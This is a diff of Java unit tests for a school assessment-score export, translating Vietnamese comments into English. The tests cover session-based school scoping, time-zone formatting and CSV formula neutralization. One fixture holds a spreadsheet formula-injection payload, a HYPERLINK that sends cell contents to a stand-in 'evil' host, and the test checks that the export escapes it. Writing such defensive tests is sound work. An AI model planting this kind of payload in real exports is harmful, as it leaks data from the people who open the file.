@@ -86,7 +86,7 @@ class ExportAssessmentScoresUseCaseTests {
     void should_require_an_assessment_or_a_schedule_scope() {
         assertThatThrownBy(() -> useCase.execute(ExportAssessmentScoresQuery.scopedTo(null, null, null)))
             .isInstanceOf(IllegalArgumentException.class)
-            .hasMessageContaining("kỳ thi hoặc ca thi");
+            .hasMessageContaining("assessment or schedule");
 
         verify(assessmentGradingQueryRepository, never()).findScoreRows(any());
     }
@@ -103,7 +103,7 @@ class ExportAssessmentScoresUseCaseTests {
         assertThat(filter.scheduleId()).isEqualTo(scheduleId);
     }
 
-    /** Trường lấy từ phiên đăng nhập, không phải từ query — chốt chặn chống xuất chéo trường. */
+    /** The school comes from the login session, not from the query -- the guard against cross-school export. */
     @Test
     void should_scope_the_filter_to_the_school_of_the_caller() {
         export();
@@ -112,8 +112,8 @@ class ExportAssessmentScoresUseCaseTests {
     }
 
     /**
-     * Bỏ trống loại bài KHÔNG được hiểu là "cả hai": câu xuất bảng điểm bản trước không
-     * lọc kind, nên xuất từ màn bài trên lớp kéo theo cả điểm kỳ thi tập trung.
+     * Leaving the kind empty must NOT be understood as "both": the previous score export query did not
+     * filter kind, so exporting from the class test screen dragged in the scores of centralized assessments too.
      */
     @Test
     void should_default_the_assessment_kind_to_centralized() {
@@ -168,7 +168,7 @@ class ExportAssessmentScoresUseCaseTests {
     void should_neutralize_a_cell_that_starts_like_a_formula() {
         givenRowWithStudentName("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")");
 
-        // Dấu nháy đơn phía trước là thứ ngăn Excel CHẠY ô này lúc mở file.
+        // The leading single quote is what stops Excel from RUNNING this cell when the file is opened.
         assertThat(export()).contains("\"'=HYPERLINK(");
     }
 
@@ -199,7 +199,7 @@ class ExportAssessmentScoresUseCaseTests {
     void should_print_the_sitting_time_in_vietnam_time() {
         givenRowWithStudentName("Nguyễn Văn A");
 
-        // Nguồn là 08:00+07:00; in ra phải là 08:00 bất kể JVM chạy ở múi giờ nào.
+        // The source is 08:00+07:00; the output must be 08:00 no matter which time zone the JVM runs in.
         assertThat(export()).contains("\"08:00 12/07/2026\"");
     }
 
@@ -207,8 +207,8 @@ class ExportAssessmentScoresUseCaseTests {
     void should_print_the_release_time_in_vietnam_time_too() {
         givenRow("Nguyễn Văn A", OffsetDateTime.parse("2026-07-20T03:30:00Z").toInstant());
 
-        // Cùng một file, cùng một người đọc: "Thời điểm công bố" không được là ISO thô
-        // giờ UTC trong khi "Ca thi" đã là giờ VN.
+        // The same file, the same reader: the "publish time" must not be a raw ISO timestamp
+        // in UTC while the "assessment schedule" is already in Vietnam time.
         assertThat(export()).contains("\"10:30 20/07/2026\"").doesNotContain("2026-07-20T03:30");
     }
 
